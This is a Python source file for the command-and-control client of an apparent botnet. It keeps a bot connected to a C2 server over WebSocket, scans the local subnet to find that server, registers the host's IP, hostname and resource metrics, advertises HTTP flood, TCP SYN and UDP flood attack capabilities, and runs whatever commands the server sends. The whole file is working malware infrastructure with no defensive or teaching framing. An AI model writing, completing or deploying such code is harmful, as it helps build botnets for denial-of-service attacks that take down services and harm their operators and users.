"""
WebSocket client for bot communication with C2 server.
"""
import asyncio
import json
import logging
import websockets
from datetime import datetime
from typing import Optional, Callable, Dict, Any
from websockets.exceptions import ConnectionClosed, InvalidURI, InvalidHandshake

from shared.config import BotClientConfig
from shared.models import HeartbeatMessage, BotStatus
from shared.utils import calculate_exponential_backoff, get_local_ip, get_hostname


class WebSocketClient:
    """WebSocket client with auto-reconnection and heartbeat."""
    
    def __init__(self, config: BotClientConfig, bot_id: str):
        self.config = config
        self.bot_id = bot_id
        self.logger = logging.getLogger(__name__)
        
        # Connection state
        self.websocket: Optional[websockets.WebSocketServerProtocol] = None
        self.connected = False
        self.running = False
        
        # Reconnection tracking
        self.reconnect_attempts = 0
        self.last_connection_time: Optional[datetime] = None
        
        # Tasks
        self.connection_task: Optional[asyncio.Task] = None
        self.heartbeat_task: Optional[asyncio.Task] = None
        self.message_handler_task: Optional[asyncio.Task] = None
        
        # Message handlers
        self.message_handlers: Dict[str, Callable] = {}
        
        # Statistics
        self.messages_sent = 0
        self.messages_received = 0
        self.connection_count = 0
        
        self.logger.info(f"WebSocket client initialized for bot {bot_id}")
    
    def register_message_handler(self, message_type: str, handler: Callable):
        """Register a handler for a specific message type."""
        self.message_handlers[message_type] = handler
        self.logger.debug(f"Registered handler for message type: {message_type}")
    
    async def start(self) -> bool:
        """Start the WebSocket client."""
        if self.running:
            self.logger.warning("WebSocket client already running")
            return True
        
        self.running = True
        
        # Start connection task
        self.connection_task = asyncio.create_task(self._connection_manager())
        
        self.logger.info("WebSocket client started")
        return True
    
    async def stop(self):
        """Stop the WebSocket client."""
        self.running = False
        
        # Cancel all tasks
        tasks = [self.connection_task, self.heartbeat_task, self.message_handler_task]
        for task in tasks:
            if task and not task.done():
                task.cancel()
                try:
                    await task
                except asyncio.CancelledError:
                    pass
        
        # Close WebSocket connection
        if self.websocket:
            await self.websocket.close()
            self.websocket = None
        
        self.connected = False
        self.logger.info("WebSocket client stopped")
    
    async def send_message(self, message_type: str, data: Dict[str, Any]) -> bool:
        """Send a message to the C2 server."""
        if not self.connected or not self.websocket:
            self.logger.warning(f"Cannot send message {message_type}: not connected")
            return False
        
        try:
            message = {
                "type": message_type,
                "data": data,
                "timestamp": datetime.now().isoformat(),
                "bot_id": self.bot_id
            }
            
            await self.websocket.send(json.dumps(message))
            self.messages_sent += 1
            self.logger.debug(f"Sent message: {message_type}")
            return True
        
        except Exception as e:
            self.logger.error(f"Failed to send message {message_type}: {e}")
            return False
    
    async def send_heartbeat(self, status: BotStatus, current_load: float, metrics: Optional[Dict] = None) -> bool:
        """Send heartbeat message to C2 server."""
        heartbeat_data = {
            "bot_id": self.bot_id,
            "timestamp": datetime.now().isoformat(),
            "status": status.value,
            "current_load": current_load,
            "metrics": metrics or {}
        }
        
        return await self.send_message("heartbeat", heartbeat_data)
    
    async def send_registration(self, bot_info: Dict[str, Any]) -> bool:
        """Send bot registration message to C2 server."""
        return await self.send_message("registration", bot_info)
    
    async def send_command_response(self, command_id: str, response_type: str, data: Optional[Dict] = None) -> bool:
        """Send command response to C2 server."""
        response_data = {
            "command_id": command_id,
            "type": response_type,
            "data": data or {},
            "timestamp": datetime.now().isoformat()
        }
        
        return await self.send_message("command_response", response_data)
    
    async def _connection_manager(self):
        """Manage WebSocket connection with auto-reconnection."""
        while self.running:
            try:
                if not self.connected:
                    await self._connect()
                
                # Wait a bit before checking connection again
                await asyncio.sleep(1)
            
            except asyncio.CancelledError:
                break
            except Exception as e:
                self.logger.error(f"Error in connection manager: {e}")
                await asyncio.sleep(5)
    
    async def _connect(self):
        """Establish WebSocket connection to C2 server."""
        try:
            # Determine C2 server address
            c2_host = self.config.c2_server_host
            if not c2_host:
                # Try to discover C2 server
                c2_host = await self._discover_c2_server()
                if not c2_host:
                    self.logger.error("Could not discover C2 server")
                    await self._handle_connection_failure()
                    return
            
            # Build WebSocket URL
            ws_url = f"ws://{c2_host}:{self.config.c2_server_port}/ws/bot/{self.bot_id}"
            
            self.logger.info(f"Connecting to C2 server at {ws_url}")
            
            # Establish connection
            self.websocket = await websockets.connect(
                ws_url,
                timeout=self.config.reconnect_interval,
                ping_interval=20,
                ping_timeout=10
            )
            
            # Connection successful
            self.connected = True
            self.last_connection_time = datetime.now()
            self.reconnect_attempts = 0
            self.connection_count += 1
            
            self.logger.info(f"Connected to C2 server (connection #{self.connection_count})")
            
            # Start heartbeat and message handler tasks
            self.heartbeat_task = asyncio.create_task(self._heartbeat_worker())
            self.message_handler_task = asyncio.create_task(self._message_handler())
            
            # Send initial registration
            await self._send_initial_registration()
            
            # Wait for connection to close
            await self.websocket.wait_closed()
            
        except (ConnectionClosed, InvalidURI, InvalidHandshake, OSError) as e:
            self.logger.warning(f"WebSocket connection failed: {e}")
            await self._handle_connection_failure()
        
        except Exception as e:
            self.logger.error(f"Unexpected error during connection: {e}")
            await self._handle_connection_failure()
        
        finally:
            # Clean up connection state
            self.connected = False
            self.websocket = None
            
            # Cancel tasks
            if self.heartbeat_task and not self.heartbeat_task.done():
                self.heartbeat_task.cancel()
            if self.message_handler_task and not self.message_handler_task.done():
                self.message_handler_task.cancel()
    
    async def _handle_connection_failure(self):
        """Handle connection failure with exponential backoff."""
        self.reconnect_attempts += 1
        
        if self.reconnect_attempts > self.config.max_reconnect_attempts:
            self.logger.error(f"Max reconnection attempts ({self.config.max_reconnect_attempts}) reached")
            self.running = False
            return
        
        # Calculate backoff delay
        delay = calculate_exponential_backoff(
            self.reconnect_attempts - 1,
            self.config.reconnect_interval,
            60  # Max delay of 60 seconds
        )
        
        self.logger.info(f"Reconnection attempt {self.reconnect_attempts} in {delay} seconds")
        await asyncio.sleep(delay)
    
    async def _discover_c2_server(self) -> Optional[str]:
        """Discover C2 server on the network."""
        try:
            from shared.utils import discover_c2_server
            
            # Try to discover C2 server on local network
            # This is a simplified version - in practice you might want to try multiple network ranges
            local_ip = get_local_ip()
            network_base = ".".join(local_ip.split(".")[:-1]) + ".0/24"
            
            c2_host = discover_c2_server(network_base, self.config.c2_server_port)
            
            if c2_host:
                self.logger.info(f"Discovered C2 server at {c2_host}")
                return c2_host
            
            return None
        
        except Exception as e:
            self.logger.error(f"Error discovering C2 server: {e}")
            return None
    
    async def _send_initial_registration(self):
        """Send initial bot registration to C2 server."""
        try:
            from shared.utils import get_system_metrics
            from shared.models import AttackType
            
            # Get system information
            metrics = get_system_metrics()
            
            # Prepare registration data
            registration_data = {
                "bot_id": self.bot_id,
                "ip_address": get_local_ip(),
                "hostname": get_hostname(),
                "connection_time": self.last_connection_time.isoformat(),
                "last_heartbeat": datetime.now().isoformat(),
                "status": BotStatus.CONNECTED.value,
                "capabilities": [
                    AttackType.HTTP_FLOOD.value,
                    AttackType.TCP_SYN.value,
                    AttackType.UDP_FLOOD.value
                ],
                "current_load": metrics.get("cpu_percent", 0.0),
                "system_info": {
                    "memory_total": metrics.get("memory_total", 0),
                    "disk_total": metrics.get("disk_total", 0),
                    "network_interfaces": len(get_local_ip().split("."))  # Simplified
                }
            }
            
            success = await self.send_registration(registration_data)
            if success:
                self.logger.info("Initial registration sent successfully")
            else:
                self.logger.warning("Failed to send initial registration")
        
        except Exception as e:
            self.logger.error(f"Error sending initial registration: {e}")
    
    async def _heartbeat_worker(self):
        """Send periodic heartbeat messages."""
        while self.connected and self.running:
            try:
                from shared.utils import get_system_metrics
                
                # Get current system metrics
                metrics = get_system_metrics()
                current_load = metrics.get("cpu_percent", 0.0)
                
                # Send heartbeat
                success = await self.send_heartbeat(
                    BotStatus.CONNECTED,
                    current_load,
                    {
                        "memory_percent": metrics.get("memory_percent", 0.0),
                        "disk_percent": metrics.get("disk_percent", 0.0),
                        "network_bytes_sent": metrics.get("network_bytes_sent", 0),
                        "network_bytes_recv": metrics.get("network_bytes_recv", 0)
                    }
                )
                
                if not success:
                    self.logger.warning("Failed to send heartbeat")
                
                # Wait for next heartbeat
                await asyncio.sleep(self.config.heartbeat_interval)
            
            except asyncio.CancelledError:
                break
            except Exception as e:
                self.logger.error(f"Error in heartbeat worker: {e}")
                await asyncio.sleep(5)
    
    async def _message_handler(self):
        """Handle incoming messages from C2 server."""
        while self.connected and self.running:
            try:
                if not self.websocket:
                    break
                
                # Receive message
                message_text = await self.websocket.recv()
                self.messages_received += 1
                
                # Parse message
                try:
                    message = json.loads(message_text)
                except json.JSONDecodeError:
                    self.logger.warning(f"Received invalid JSON: {message_text}")
                    continue
                
                # Handle message
                await self._handle_message(message)
            
            except ConnectionClosed:
                self.logger.info("WebSocket connection closed")
                break
            except asyncio.CancelledError:
                break
            except Exception as e:
                self.logger.error(f"Error in message handler: {e}")
                await asyncio.sleep(1)
    
    async def _handle_message(self, message: Dict[str, Any]):
        """Handle a received message."""
        try:
            message_type = message.get("type")
            if not message_type:
                self.logger.warning("Received message without type")
                return
            
            # Check if we have a handler for this message type
            if message_type in self.message_handlers:
                handler = self.message_handlers[message_type]
                await handler(message)
            else:
                self.logger.warning(f"No handler for message type: {message_type}")
        
        except Exception as e:
            self.logger.error(f"Error handling message: {e}")
    
    def get_connection_stats(self) -> Dict[str, Any]:
        """Get connection statistics."""
        return {
            "connected": self.connected,
            "running": self.running,
            "bot_id": self.bot_id,
            "connection_count": self.connection_count,
            "reconnect_attempts": self.reconnect_attempts,
            "last_connection_time": self.last_connection_time.isoformat() if self.last_connection_time else None,
            "messages_sent": self.messages_sent,
            "messages_received": self.messages_received,
            "c2_server_host": self.config.c2_server_host,
            "c2_server_port": self.config.c2_server_port
        }